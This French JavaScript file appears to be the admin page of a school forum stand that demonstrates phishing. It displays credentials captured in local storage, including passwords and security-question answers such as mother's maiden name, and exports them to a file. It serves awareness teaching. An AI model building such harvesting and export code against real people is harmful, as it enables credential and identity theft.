/* ============================================================
   STAND BTS SIO — Page admin
   Affiche les captures stockées en local et permet de les
   exporter dans un fichier JavaScript (captures.js).
   ============================================================ */

(function () {
  "use strict";

  function charger() {
    try {
      return JSON.parse(localStorage.getItem("captures_stand") || "[]");
    } catch (err) {
      return [];
    }
  }

  function afficher() {
    var captures = charger();
    document.getElementById("total").textContent = captures.length;

    var liste = document.getElementById("liste");

    if (captures.length === 0) {
      liste.innerHTML = '<p class="vide-admin">Aucune capture pour le moment. ' +
                        'Les saisies apparaîtront ici. 👀</p>';
      return;
    }

    liste.innerHTML = captures.map(function (c, i) {
      return '<div class="capture-carte">' +
        '<div class="entete"><span>#' + (i + 1) + '</span><span>' + (c.date_capture || "") + '</span></div>' +
        champ("Nom", c.nom) +
        champ("E-mail", c.email) +
        champ("Téléphone", c.telephone) +
        champ("Naissance", c.naissance) +
        champ("Ville", c.ville) +
        champ("Mot de passe", c.motdepasse) +
        champ("1er animal", c.animal) +
        champ("Nom jeune fille mère", c.mere) +
      '</div>';
    }).join("");
  }

  function champ(label, valeur) {
    if (!valeur) return "";
    return '<div class="champ"><b>' + label + '</b><span>' + echapper(valeur) + '</span></div>';
  }

  function echapper(txt) {
    var div = document.createElement("div");
    div.textContent = String(txt);
    return div.innerHTML;
  }

  /* ---------- Export vers un fichier .js ---------- */
  function exporter() {
    var captures = charger();
    if (captures.length === 0) {
      alert("Aucune capture à exporter.");
      return;
    }
    var contenu =
      "// Captures du stand BTS SIO — démonstration phishing\n" +
      "// Généré le " + new Date().toLocaleString("fr-FR") + "\n" +
      "// ATTENTION : données de démonstration, à supprimer après le forum.\n\n" +
      "const captures = " + JSON.stringify(captures, null, 2) + ";\n";

    var blob = new Blob([contenu], { type: "text/javascript" });
    var url = URL.createObjectURL(blob);
    var a = document.createElement("a");
    a.href = url;
    a.download = "captures.js";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  function vider() {
    if (!confirm("Effacer toutes les captures de cet appareil ? (irréversible)")) return;
    localStorage.removeItem("captures_stand");
    afficher();
  }

  document.getElementById("btn-export").addEventListener("click", exporter);
  document.getElementById("btn-vider").addEventListener("click", vider);

  afficher();
})();
